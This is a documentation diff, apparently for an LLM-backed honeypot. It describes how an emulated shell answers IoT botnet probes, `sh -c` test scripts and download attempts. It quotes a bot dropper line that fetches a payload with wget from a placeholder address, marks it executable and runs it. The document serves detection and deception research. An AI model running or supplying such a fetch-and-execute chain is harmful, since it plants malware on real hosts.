@@ -65,18 +65,33 @@ no subprocess:
   scenario's lures where they live;
 - the IoT botnet openers: `sh` (a nested shell, no output), `enable` (bash's list of
   builtins: both front ends present bash, and a bot sending it reads nothing from the
-  reply), `system`, `shell` and `linuxshell` (`command not found`, as bash says), and
-  `busybox NAME` (`NAME: applet not found`), with the BusyBox version the distribution
-  release ships; RHEL and its rebuilds ship none, so there `busybox` is
+  reply), `system`, `shell`, `linuxshell` and any other word that names no builtin, alias
+  or program the host's `ls` of the bin directories or its `ps` shows (`command not found`,
+  as bash says; a program a working server very often has beyond the minimal image, such
+  as `ss`, `vim`, `journalctl` or `docker`, goes to the model), and `busybox NAME` (`NAME: applet not found`), with the BusyBox version the
+  distribution release ships; RHEL and its rebuilds ship none, so there `busybox` is
   `command not found`;
-- `wget`, `curl` and `tftp`, which exist but fail (no route, or no name resolution) without
-  any lookup or connection;
-- `echo` (including `-e` escapes) and the quiet builtins.
+- `wget`, `curl`, `tftp` and `busybox ftpget`, which exist but fail (no route, or no
+  name resolution) without any lookup or connection;
+- `echo` (including `-e` escapes) and the quiet builtins;
+- `sh -c SCRIPT` (and `bash -c`) for the short scripts bots send to test a shell: `printf`
+  with `%s`, `%d`, `%i`, `%%` and `\n`, `\t`, `\r`, `\\`, `echo` without options or
+  backslashes, `$((...))` with `+ - * / %` in 64-bit arithmetic, `$$`, `$#`, `$0` to `$9`,
+  `set --`, `true`, `false`, `:`, functions and `{ }` groups, joined by `;`, `&&` and `||`.
+  A backslash follows the POSIX rule, in the script and on the line: inside double quotes
+  it quotes only `$`, `` ` ``, `"`, `\` and a newline and stays before anything else; outside
+  quotes it quotes the next character. The output is what dash and bash print. `$$` is a pid between the login shell's in `ps`
+  and the last pid in `/proc/loadavg`, the same throughout one script and higher in each
+  later one. A script is at most 1024
+  characters and runs at most 256 commands; anything else in it leaves the whole line to
+  the model;
+- `/proc/self/cmdline`, the reading program's arguments as typed, each ended by a NUL.
 
 A command given by path (`/bin/uname`, `/bin/./uname`, `/usr/bin/id`) answers the same.
 Pipelines of that output through `grep` (`-c`, `-i`, `-v`, `-n`, `-q`, `-F`, `-e`),
 `head`/`tail -n`, `cut -d -f/-c`, `wc` and `awk '{print $N, ...}'` (with `-F`) are
-evaluated in Python, as are `;`, `&&` and `||` lists of them. `grep` patterns are fixed
+evaluated in Python, as are `;`, `&&` and `||` lists of them and `( list )` subshells,
+whose `cd` stays inside and whose output goes through the group's own redirections. `grep` patterns are fixed
 strings plus `.`, `^` and `$`, matched by hand; no attacker text is ever compiled as a
 regular expression, and the module's own parsing of attacker text (words, `awk` programs,
 `cut` lists, counts, `echo -e` escapes) is a single linear pass.
@@ -102,7 +117,15 @@ from the distribution's busybox package), and `/bin/echo`, `/bin/busybox` and
 `/proc/self/exe` read as the start of an ELF image for the host's machine
 (`agents/elfimage.py`), the same bytes through `cat`, `dd` and a `while read` loop. Files a
 Telnet session writes (`>x`, `cp`, `chmod`, `echo -ne ... >> x`) are kept in memory for
-that session (32 entries, 128 KiB) and never run. Binary bytes leave as the exact bytes;
+that session (32 entries, 128 KiB) and never run. In a system directory whose listing the
+shell does not have (`/etc`, `/usr`, `/var`, `/dev`, `/run`), a session makes only a dot
+name or a one-character name (`/var/.f`, `/var/d`), which is never one of the host's own
+entries there; `ls -la /var/d`, `cat`, `rm` and running it answer from the session, and a
+listing of the whole directory goes to the model. A dropper such as
+`(wget http://ADDR/x -O- || busybox wget http://ADDR/x -O-) > x; chmod 777 x; ./x` prints
+both download errors, leaves `x` empty, and an empty file runs as an empty script. The
+`tftp -g` form goes to the model: the tftp clients print different things for busybox's
+options. Without a model, that transfer fails as a timeout. Binary bytes leave as the exact bytes;
 the event log and the model's history keep `\xNN` text instead.
 
 With a model and `[llm] local_shell_replies = true` (the default), a line the shell can
@@ -112,11 +135,13 @@ session has done (`agents.shell.FIXED`, `SESSION`, `STATE`; a line takes the hig
 - Facts no command can change are answered locally for the whole session: the kernel
   (`uname` without the nodename), `uptime`, `w`, `who`, `nproc`, `free`, `lscpu`, `lspci`,
   `nvidia-smi` on a GPU host, the `/proc` CPU, memory, version, uptime and load files,
-  `echo`, the IoT openers and `busybox` applet probes.
+  `/proc/self/cmdline`, `echo`, `sh -c` scripts, an empty line, the IoT openers and
+  `busybox` applet probes.
 - Facts a session can change (`hostname`, `uname -n` and `-a`, `whoami`, `id`, `which`,
   `command -v`, `ls`, `pwd`, `ps`, `df`, `sh`, every file outside those `/proc` files,
-  including `/etc/os-release` and the other release files, a file that does not exist, and
-  a program path that does not exist, such as `/usr/bin/xmr`) are answered locally only
+  including `/etc/os-release` and the other release files, a file that does not exist, a
+  program path that does not exist, such as `/usr/bin/xmr`, and a command the host does
+  not have) are answered locally only
   until a model reply (fresh or cached) has answered a command in the session; after that
   the model answers them, because it may have run `hostname x`, `useradd`, written a file
   or downloaded a program. The model's own session opener does not count.
